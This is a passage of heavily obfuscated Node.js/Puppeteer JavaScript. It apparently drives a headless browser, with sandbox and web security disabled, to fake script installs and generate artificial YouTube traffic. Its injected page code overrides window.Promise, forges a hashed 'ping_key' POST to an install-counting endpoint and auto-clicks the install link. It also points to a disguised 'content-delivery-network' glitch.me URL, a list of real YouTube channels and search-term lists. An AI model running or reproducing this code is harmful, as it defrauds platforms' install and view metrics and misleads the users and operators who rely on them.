                J[-0x12c8 + 0x2320 + -0x1048] = this['block'], J[K >> 0xc7b + -0x522 + -0x757 * 0x1] |= x[-0x1 * 0x3fa + 0x1eb2 + 0x8e7 * -0x3 & K], this['block'] = J[-0x1feb * -0x1 + 0x2fe * -0x9 + 0xd * -0x61], K >= 0x3 * -0xc73 + 0x235 * -0x10 + 0x48e1 && (this['hashed'] || this['hash'](), J[-0x1 * -0x1b97 + 0x703 * 0x2 + 0x299d * -0x1] = this['block'], J[-0x2 * 0x78 + -0x16ae + 0xbd7 * 0x2] = J[-0x1 * 0x1e2e + 0x56 * -0x3a + 0x31ab] = J[-0x4 * 0x559 + -0x2088 * -0x1 + -0xb22] = J[-0xdb3 + -0xd9e + 0x1b54] = J[-0xb01 * 0x1 + -0x1a40 + 0x2545 * 0x1] = J[0x1f4b * -0x1 + -0x1473 + 0x33c3] = J[0x433 + -0x167d + 0x1250] = J[-0x122d + -0x1cb0 + 0x2ee4] = J[-0x9 * 0x3f5 + 0x2 * 0x10c1 + 0x223] = J[0x8f * 0x3b + 0x1 * 0x1ec2 + -0x3fae] = J[-0xc95 * -0x1 + -0x8e0 + 0x3 * -0x139] = J[-0x1fd5 + 0x2157 + -0x4b * 0x5] = J[-0x2379 + -0xee9 + 0x1937 * 0x2] = J[0x2 * 0x622 + -0x15 * 0x11e + 0x1 * 0xb3f] = J[0x14a2 + -0x6be * -0x2 + -0x2210] = J[-0x1861 + -0x9d + 0x190d] = -0x251f + 0x5 * -0x124 + -0x2ad3 * -0x1), J[-0x147 + 0x7f1 + -0x69c] = this['hBytes'] << -0x7 * -0x97 + 0x1cf3 + -0x2111 | this['bytes'] >>> 0x3fd * -0x9 + -0x1a86 + 0x3e88, J[0x4d4 + 0x25 * -0x89 + -0xf08 * -0x1] = this['bytes'] << -0x1750 + -0x2673 + 0x3dc6, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x4 * 0x66e + 0x3 * -0x623 + 0x1a3 * 0x1b; J < 0x26d6 + 0x83b + -0x2ec1; ++J)
                K = Q[J - (0x1 * -0x149f + -0x216d * -0x1 + -0xccb)] ^ Q[J - (-0x2 * -0xdcd + -0x1d3 * 0xb + -0x11 * 0x71)] ^ Q[J - (-0x14b * 0x7 + 0x1a2 * 0x6 + -0xb1)] ^ Q[J - (-0xf8e * -0x2 + 0x1 * -0x1915 + -0x5f7)], Q[J] = K << -0xd07 + 0xd9a * -0x2 + 0x283c | K >>> 0x367 * -0xa + -0xbf8 * 0x2 + 0x3a15 * 0x1;
              for (J = 0x4d * -0x2d + 0x1 * -0x2f3 + 0x107c; J < 0x1a7c + -0x2 * 0xc69 + -0x196; J += -0x1 * 0xa5d + -0x8c2 + 0x1324)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x20f + 0x3ad + 0x1 * -0x199 | L >>> -0x320 + 0x26e7 + -0xc * 0x2f9) + (M & N | ~M & O) + P + (-0x3867c956 + 0x98a43210 + 0x1e8a50b * -0x3) + Q[J] << -0x5e * 0x1 + -0x1d14 + 0x1d72 * 0x1) << 0x9f3 + -0x1d98 + 0x13aa * 0x1 | P >>> 0x1 * 0x17f5 + 0x238f + -0x3b69) + (L & (M = M << 0x38b * 0x3 + -0x6ce + 0xd * -0x49 | M >>> 0x23c6 + 0x1 * -0x66a + 0xdd * -0x22) | ~L & N) + O + (-0x18a69c8b * -0x5 + 0x691a7c2f + 0x925 * -0xf1309) + Q[J + (-0x1768 + 0x2072 + -0x909)] << -0x6c3 + 0x1d7e + -0x16bb) << -0x18c9 + 0x523 + 0x13ab | O >>> 0x177b + 0x230d + -0x3a6d) + (P & (L = L << -0xede + 0x2a0 + 0x317 * 0x4 | L >>> -0x206 + 0xb * 0x224 + 0x132 * -0x12) | ~P & M) + N + (-0x45e86e93 + -0x7d9f * 0xf619 + 0x1192df6b3) + Q[J + (-0x1 * -0xd27 + -0x2 * -0x1af + -0x1083)] << -0x1d * 0x139 + -0x11 * -0x34 + 0x2001) << -0x2396 + -0x3d * 0x53 + -0x93b * -0x6 | N >>> 0x1553 + -0x38b + -0x11ad) + (O & (P = P << -0x8f4 + -0xf4a + 0x185c | P >>> 0x137b + 0x50a + 0x4e7 * -0x5) | ~O & L) + M + (0xd87d5 * -0x9fd + -0x100e209 * -0x35 + 0xac79683d) + Q[J + (0xb * 0x1e5 + -0xd * -0x166 + 0x2702 * -0x1)] << -0x62a + 0xfd9 * 0x2 + 0xac * -0x26) << -0x10c * 0x1b + 0x9fb + -0x2 * -0x927 | M >>> -0x1335 + 0x1 * 0x1d7d + -0x209 * 0x5) + (N & (O = O << -0x2249 + 0x3c * 0x3b + 0x17 * 0xe5 | O >>> 0xfe * 0x1a + 0xf88 + -0x29 * 0x102) | ~N & P) + L + (-0x1f8ef6f0 + 0x43dbe986 + 0x36358703 * 0x1) + Q[J + (-0x263a + -0xd7 + 0x2715)] << -0x4a6 + 0x109a + -0x99 * 0x14, N = N << -0x21c1 + 0x1 * 0xdef + -0x8 * -0x27e | N >>> 0x15bf + 0xc36 + -0x21f3;
              for (; J < -0x1173 * 0x1 + 0x1f1 * 0x4 + 0x1 * 0x9d7; J += -0x1be9 + -0x209c + -0x52 * -0xbd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1e77 + 0x1 * -0x215a + 0x1feb * 0x2 | L >>> -0x2511 + 0x22eb + 0x241) + (M ^ N ^ O) + P + (-0x5729a3a8 + 0xb3b9f79f + -0x924cbd5 * -0x2) + Q[J] << -0x3b * -0x8e + 0x21a3 + 0x15 * -0x329) << 0x15b1 + -0x6c3 + -0xee9 | P >>> -0x1a6e + 0x1610 + 0x1 * 0x479) + (L ^ (M = M << -0x44 * 0x83 + 0x2b4 * -0x8 + 0x1 * 0x388a | M >>> -0x94a * 0x2 + -0x1fda + 0xc9c * 0x4) ^ N) + O + (0x23de0f41 + -0x4b * -0x22467ea + -0x55ae952e) + Q[J + (0xd0 * 0x2e + -0x1 * -0xae7 + -0x3046)] << 0xf34 + -0x4e7 + -0x125 * 0x9) << -0xba7 + -0x3c1 + 0xf6d | O >>> -0x1 * 0x1f2e + -0x15d * 0xd + -0x29 * -0x132) + (P ^ (L = L << -0x205c + 0x8c3 * -0x1 + -0x11 * -0x26d | L >>> 0xb8f + 0x16a2 + 0xb65 * -0x3) ^ M) + N + (0xf * -0xa0e1e16 + 0x4fc764c9 + 0xb5e64a22) + Q[J + (-0x772 + -0x21a1 + 0x2915)] << -0xb57 * 0x3 + -0x6a5 + -0x822 * -0x5) << 0x19e4 * 0x1 + -0x1c62 + 0x283 * 0x1 | N >>> 0x16fa + 0x4ff * 0x2 + 0xb3 * -0x2f) + (O ^ (P = P << 0x1e73 + 0x1415 + 0x36 * -0xef | P >>> -0xa3 * 0x29 + 0x2 * 0x47d + 0x1 * 0x1123) ^ L) + M + (-0xaa3c2065 + 0x25 * -0x48b5609 + 0x1 * 0x1c1397b53) + Q[J + (-0x254b + -0x32b * 0x7 + 0x3b7b * 0x1)] << -0x1dcd * 0x1 + 0xa * 0xe3 + 0x14ef) << -0xf * -0x24b + -0x1 * -0x1e9a + -0x40fa | M >>> -0x493 * -0x7 + 0x8 * -0x337 + -0x1a * 0x3d) + (N ^ (O = O << 0x6 * -0x1c1 + 0x6e6 * -0x4 + 0x263c | O >>> 0x95f + 0x1 * 0x256c + -0x2ec9) ^ P) + L + (0x1c38a * 0x78db + -0x6474202 + 0x40fcf * -0x17a5) + Q[J + (-0x2427 + -0x85 * 0x2f + -0x6e * -0x8d)] << 0x247e + -0x1748 + -0xd36, N = N << 0x6fd * 0x2 + -0x4 * -0x577 + -0x23b8 | N >>> -0x1 * 0x2077 + -0x685 + 0x17 * 0x1b2;
              for (; J < -0x1b4f + 0x8 * -0x3eb + 0x3ae3; J += -0x2be + 0x25a8 + -0x1 * 0x22e5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1c37 * 0x1 + -0x26da * -0x1 + 0x4 * -0x10c3 | L >>> -0xd3d * 0x1 + 0x2 * -0x85d + 0x1e12) + (M & N | M & O | N & O) + P - (-0x6dd32 * -0x271 + 0xf1 * -0xdf38fe + -0x1985e844 * -0xc) + Q[J] << -0x1b6c + 0x1f62 * -0x1 + 0x3ace) << -0x2 * -0x79d + -0xf95 + -0x1 * -0x60 | P >>> -0x1 * 0x1445 + -0x8e2 + 0x7 * 0x42e) + (L & (M = M << 0xb90 * -0x1 + 0xb * -0x211 + 0x2269 | M >>> 0x2384 + -0x23e0 * 0x1 + 0x5e) | L & N | M & N) + O - (-0x947f * -0xcf55 + -0xeb21309 + -0x29 * -0x2db732) + Q[J + (0xb4 * 0x17 + 0x1326 + -0x2351)] << -0xe4 + 0x1e05 + -0x1d21) << -0x1c43 + -0xb12 + 0x1b6 * 0x17 | O >>> -0x23ba + 0xc37 + 0x179e) + (P & (L = L << 0x21da + 0x22c0 + -0x447c | L >>> -0x22a9 + 0x16aa + 0x1b7 * 0x7) | P & M | L & M) + N - (0x64eb16fb + 0x24f60a7 * 0xf + 0x912324 * -0x28) + Q[J + (-0x5 * -0x7a2 + -0x434 * 0x2 + -0x1dc0)] << -0x1ecf + 0x1ca2 + 0x22d) << -0x1ba3 + -0xc1 * -0x31 + -0x949 | N >>> 0x18db + 0x1674 + -0x2f34) + (O & (P = P << -0x1096 + -0x16dd + 0x5a7 * 0x7 | P >>> -0x300 * -0x8 + 0x26b * -0xf + 0xc47) | O & L | P & L) + M - (-0x931d2ca6 + 0xd46e50f7 * -0x1 + 0x1d86fc0c1) + Q[J + (-0x201f + -0x2266 + 0x4288)] << -0x1f22 * 0x1 + -0xd3 * 0x5 + 0x2341) << 0xeb7 + 0x1 * 0x1389 + -0x1 * 0x223b | M >>> 0x7e8 + -0xe47 + 0x67a) + (N & (O = O << -0x1a0e + -0x1ad5 + 0x3 * 0x11ab | O >>> 0xf46 + 0x1 * 0x19a + 0x7f * -0x22) | N & P | O & P) + L - (0x226736e2 + 0xaa208e49 + -0x563f897 * 0x11) + Q[J + (-0x2 * 0xe13 + 0x1907 + 0x49 * 0xb)] << 0xe9 * -0x10 + -0x1ae1 * 0x1 + 0x2971, N = N << 0x22c2 + 0x11a8 * -0x2 + 0xac | N >>> -0xe43 + 0x2 * 0xf97 + -0x6f * 0x27;
              for (; J < 0x17e9 + -0x3 * -0xb57 + -0x19 * 0x24e; J += 0x1770 + 0x17 * 0x115 + 0x101a * -0x3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1f60 + 0x18b7 + -0x23a * -0x3 | L >>> -0x328 * -0xb + 0x51 * -0x51 + -0x8fc) + (M ^ N ^ O) + P - (0x1d84cd2c + -0x5 * -0x858d403 + 0x11a3b311 * -0x1) + Q[J] << 0x1 * 0x7cf + -0x22fb * 0x1 + 0x1b2c) << 0xb * 0x65 + 0xac6 + 0x1c * -0x8a | P >>> 0x1d5d + 0x1869 + -0x4e1 * 0xb) + (L ^ (M = M << -0x24d6 + -0x10bf * 0x2 + 0x4672 | M >>> -0x57 * 0x13 + 0xb1c + 0x1 * -0x4a5) ^ N) + O - (0x22c06d8d + -0x449471a5 + 0x16 * 0x3f98303) + Q[J + (-0x71 * -0x50 + 0xea9 * -0x1 + 0x2 * -0xa53)] << -0x17 * -0xa6 + -0x9d7 + -0x513 * 0x1) << -0x29b * 0x2 + -0x2c * 0xd + 0x777 | O >>> -0x1 * 0x2245 + 0x8cc + 0x1994) + (P ^ (L = L << -0x126a * 0x1 + 0x2382 + 0x2 * -0x87d | L >>> 0x68c + 0x1116 + -0x17a0) ^ M) + N - (-0x6548b28 + -0x17 * 0x2e15303 + 0x1f * 0x4121289) + Q[J + (-0x2320 * -0x1 + -0x1 * 0xeb7 + -0x1467)] << 0x190c + -0x1d1d + 0x411) << -0x129b * -0x1 + -0x1 * 0xcaf + -0x5e7 * 0x1 | N >>> 0x127a + 0xd06 * -0x1 + -0x559) + (O ^ (P = P << -0x29 * -0x95 + 0x250b * -0x1 + 0xd4c | P >>> 0x1 * -0xd49 + -0x26f8 + 0x3443) ^ L) + M - (0xc511ac * -0x25 + -0x1 * 0xf77e7f9 + 0x17f7 * 0x41239) + Q[J + (0x3 * -0x2e3 + -0x17 * 0x1af + -0xb * -0x44f)] << -0x5 * 0x347 + -0x4a9 * -0x1 + 0xbba) << -0x1 * -0xedc + 0x24ff + -0x33d6 | M >>> -0x6a6 + -0x4 * 0x2c2 + 0x11c9) + (N ^ (O = O << 0x2080 + -0xb * -0x4f + 0xbed * -0x3 | O >>> -0x245f + -0x318 + 0x2779) ^ P) + L - (-0x66075cba + -0x1c37fa * 0xd9 + -0x866f2 * -0x155f) + Q[J + (-0x1 * 0xcaa + 0x1 * -0x1145 + 0xb * 0x2b9)] << -0x42c + 0x5d4 * -0x1 + 0xa00, N = N << -0x83f * -0x1 + 0x6ac * -0x4 + 0x128f | N >>> 0x1c56 + -0x21d6 * -0x1 + -0x3e2a;
              this['h0'] = this['h0'] + L << 0xf4f * -0x1 + 0x22c8 + 0x1379 * -0x1, this['h1'] = this['h1'] + M << -0x18 * 0x34 + -0x637 * 0x5 + 0x23f3 * 0x1, this['h2'] = this['h2'] + N << -0x27 * 0x6d + -0x20 * 0x3d + 0x1 * 0x183b, this['h3'] = this['h3'] + O << -0x1e17 + 0x143f + 0x24 * 0x46, this['h4'] = this['h4'] + P << -0x1b01 + -0x8 * 0x183 + 0x1 * 0x2719;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x9cf + -0x1eef * 0x1 + 0x153c & -0x247f + 0x6 * 0x66b + 0x2 * -0xfa] + w[J >> 0x1e99 + -0x1 * 0xe2 + -0x1d9f & 0x1eb8 + -0x1e99 + -0x2 * 0x8] + w[J >> -0x6da + 0xfd * -0x5 + 0x1 * 0xbdf & 0x1390 + -0x4d2 * 0x4 + -0x39] + w[J >> -0x2 * 0x98d + -0x37 * -0x7 + 0x11a9 & -0xfde + 0x61 * 0x4d + -0x6a * 0x20] + w[J >> 0x1 * -0x13e5 + 0x1 * -0x1193 + 0x2584 & -0x1403 + 0xb3 * -0x9 + 0x1a5d] + w[J >> -0x121d + 0x30 * -0xd + -0x1495 * -0x1 & -0x1748 + 0x1 * 0x1105 + 0x652] + w[J >> -0x6 * 0x19c + 0x1 * 0x3c3 + -0x1 * -0x5e9 & 0xa * 0x22e + 0x2fd + 0xf * -0x1a6] + w[-0x265c + 0x1ae3 + -0x148 * -0x9 & J] + w[K >> 0x24f5 + -0x19db + -0xafe & 0x4c9 * -0x5 + 0x6a3 * -0x2 + 0x2 * 0x12a1] + w[K >> -0x25e1 + 0x52 * 0x2a + 0x1885 & 0x13 * 0x35 + -0x9bd + -0x13 * -0x4f] + w[K >> -0x5b * 0x23 + -0x14e3 + 0x2168 & 0x16 * 0x85 + -0x2e2 * -0x2 + 0x6b * -0x29] + w[K >> 0x20f3 + 0x110e * -0x2 + 0x139 & -0x197 + -0x74c * -0x4 + -0x1b8a] + w[K >> 0x1 * -0x1b7a + 0x7 * 0x61 + -0x1 * -0x18df & 0x144b + 0x17b7 + -0x2bf3] + w[K >> 0x1 * 0xe1f + -0xdf6 * -0x2 + -0x1 * 0x2a03 & 0x1fa0 + 0x1b4a + -0x3adb] + w[K >> 0x1fe + -0x312 + 0x118 & 0x115f + 0x2f9 * -0xd + 0x1555] + w[0x64d * 0x3 + 0x2 * -0x531 + -0x72 * 0x13 & K] + w[L >> -0x1f7 * -0xf + -0x513 * -0x6 + -0x3bcf & 0x4b8 * 0x5 + 0xb66 + 0xb * -0x32d] + w[L >> 0x1 * -0x1e7 + -0x1 * -0x166d + -0x146e & 0x1 * 0x6cd + -0x1b28 + 0x43 * 0x4e] + w[L >> 0x1b71 + 0x11bc + -0x905 * 0x5 & -0x1 * -0x10e7 + 0x609 + -0x16e1] + w[L >> 0x1 * -0xd4a + 0xd1 + -0xc89 * -0x1 & -0x5 * 0x2f5 + -0x1d1a + 0x2bf2] + w[L >> 0x1bd8 + -0x87c + -0x1350 & 0xd03 + 0x2d2 + -0xfc6 * 0x1] + w[L >> -0x7ed * -0x1 + -0xa49 + 0x264 & 0x3d8 + 0x62 * 0x15 + -0xbd3] + w[L >> 0x1a3e + -0x1 * -0xcbd + -0x26f7 & 0x23d6 + -0x3 * -0xf + 0x2 * -0x11fa] + w[-0x5b5 + -0x263c + 0x2c00 & L] + w[M >> -0x2d * 0x1 + 0x89 * 0x10 + -0x847 & 0x1c77 + 0x2153 + -0x3dbb] + w[M >> -0x3d9 + -0x255b + -0xc * -0x371 & 0x8 * 0x44e + -0x3 * -0xc99 + -0x1 * 0x482c] + w[M >> -0x5 * -0x5eb + -0x5 * 0x50b + 0x4 * -0x113 & -0x260c + 0x38a * 0x2 + 0x1f07] + w[M >> 0x306 * -0x9 + -0x27e * -0x5 + -0x18 * -0x9e & 0x5ce + -0x24fa + -0xf * -0x215] + w[M >> 0x1b9e + 0x4b6 + 0x812 * -0x4 & -0x13a * 0x1 + -0xd * 0x2cc + -0x1a3 * -0x17] + w[M >> 0x3d * 0x95 + -0x964 + -0x1a15 & -0x59 * 0x3 + 0xad7 + -0x9bd] + w[M >> 0xc0e + 0x836 * -0x3 + 0xc98 & -0x23bd + -0x1 * -0xb7b + -0x3 * -0x81b] + w[0x8 * 0x48d + -0x49 * -0x16 + -0x2a9f & M] + w[N >> 0x1 * -0x67b + -0x2 * 0x1ed + 0xa71 & -0xb57 + -0x1d6e + 0x28d4] + w[N >> -0x1d5f + -0x1379 * 0x2 + 0x1 * 0x4469 & -0xed4 + -0x19 * -0x29 + 0xae2] + w[N >> 0x86 + 0x1 * -0x15a7 + 0x1535 & 0xf * -0x163 + 0x2 * -0x1211 + -0xa * -0x5b3] + w[N >> 0x1126 * -0x2 + 0x1fee + 0x2 * 0x137 & -0x83 * 0xb + 0x6aa * -0x1 + 0xc5a] + w[N >> 0x3b * -0x65 + -0x58 * 0x1 + -0x1 * -0x17ab & -0xd9f + -0x1146 + -0x11b * -0x1c] + w[N >> 0x2 * 0x577 + 0x1 * -0x1319 + 0x833 & 0x186d + 0x1a43 + -0x32a1] + w[N >> 0x17b6 + -0x1636 + -0x17c & -0x528 + 0x804 + -0x1 * 0x2cd] + w[0x113c + 0x4 * -0x8a8 + 0x1173 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x8 * -0x1c0 + -0x1 * 0x120b + 0x423 & 0x1 * -0x143b + -0x26af + -0x31 * -0x139,
                J >> 0xf51 + -0x2b3 * -0xa + -0xe15 * 0x3 & 0xbee + -0x209 * -0x1 + -0x2 * 0x67c,
                J >> 0x1b1a + 0x213f + -0x3c51 & -0x24 * 0x21 + -0x10 * -0x3 + -0x5d * -0xf,
                0x318 + 0x7 * 0x17f + 0xc92 * -0x1 & J,
                K >> -0x885 * 0x2 + -0x1 * 0x188c + -0x2 * -0x14d7 & -0x2597 + -0x15f0 + 0x1 * 0x3c86,
                K >> -0x1 * -0x499 + 0x1186 * 0x2 + -0x2795 * 0x1 & 0x1c77 + 0x1d6f + -0x1 * 0x38e7,
                K >> -0x147b + -0x7 * 0x193 + 0x1f88 & 0x315 * 0x5 + 0x2 * -0x7c2 + 0x11a,
                0x860 + -0x155c * 0x1 + 0xdfb & K,
                L >> -0x2 * -0x315 + -0x2 * 0x1307 + -0x1ffc * -0x1 & -0x231 * 0x11 + -0x11bd + 0x37fd,
                L >> 0x382 * -0x1 + -0x1 * 0x1d75 + 0x2107 & 0x2 * -0x5ee + -0x7 * -0x53 + 0xa96 * 0x1,
                L >> 0x2395 * -0x1 + -0x1549 * -0x1 + 0x1c * 0x83 & 0x26c8 + -0x1e3e + -0x78b,
                0x774 + -0x1c15 + -0x15a0 * -0x1 & L,
                M >> -0x67a * 0x1 + -0x1382 * 0x1 + 0x1a14 & -0x124 * -0x1b + -0x25c3 + 0x1 * 0x7f6,
                M >> -0x949 * -0x3 + 0xfe3 * 0x2 + -0xdd * 0x45 & 0x22 * 0x91 + 0x269 * 0x2 + -0x1715,
                M >> 0xf17 * -0x1 + 0x427 + 0xaf8 & -0x1 * -0x92f + 0xd71 * -0x1 + -0x1 * -0x541,
                -0x2 * -0xaec + -0x2e3 + -0x1 * 0x11f6 & M,
                N >> -0x17e6 + 0x1 * 0xa3c + 0x1 * 0xdc2 & 0x1d58 + -0x99c + 0x215 * -0x9,
                N >> -0x1 * -0xe + 0x16 * -0x24 + -0x18d * -0x2 & -0x293 * -0xc + -0x1142 + 0x1 * -0xca3,
                N >> -0x12b7 * 0x1 + 0xa1b + 0x8a4 & -0x7b8 * 0x1 + 0x1d3b + -0x1484,
                0x28 * 0xf1 + -0x2325 + -0x1 * 0x184 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1d * -0x81 + 0x1b86 + -0xf * 0xdb), (K = new DataView(J))['setUint32'](-0x11d + -0x29b * -0xb + -0x1b8c, this['h0']), K['setUint32'](0x39 * 0x7 + 0x617 + -0x3d1 * 0x2, this['h1']), K['setUint32'](-0x1348 * -0x2 + -0x52f + -0x1 * 0x2159, this['h2']), K['setUint32'](0x55 * -0x1 + -0x1 * 0x467 + 0x264 * 0x2, this['h3']), K['setUint32'](-0x1b1f + -0x1d97 + 0x38c6, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x229d * 0x1 + 0xbdf + 0x47 * 0x52];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            const Y = c;
            let K = -0x1ab0 + -0x1b74 + 0x3624;
            J[0x2 * -0x121f + 0x1a3c + -0xb7 * -0xe]['toString']()['includes'](Y(0x12) + 'te(\x22data-p' + 'ing-url') && (J[-0xb1f + 0x2e * 0xb8 + -0x15f1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0xf3a + 0x1564 + -0x249d), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x6f * 0x37 + -0x6f * -0x29 + -0x613 * -0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x6c * 0x3b + 0x64 * -0x5e + -0x1 * -0x4378), Promise['resolve'](-0xcc6 + 0x7fb * 0x2 + -0xa3 * 0x5);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1a32 + -0xa14 + 0x2 * 0x1223; j < -0x2386 + -0x9d4 * 0x2 + 0x372f; j++)
    i();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x13b6 + -0x1a2c + -0x1 * -0x2de2);
    let h = e[f];
    return h;
  }, d(b, c);
}
const NETWORK_PATIENCE = 0x133 * -0x2b + -0x604 + 0x58d5 + (0x4 * 0x904 + -0x16 * 0x54 + -0x1120 * 0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x3 * 0x25f + -0x265a + 0x2d7a) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + Z(0x2) + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1d29 + 0xbc * -0x4 + 0x2eb * 0xb; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + a0(0x1) + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 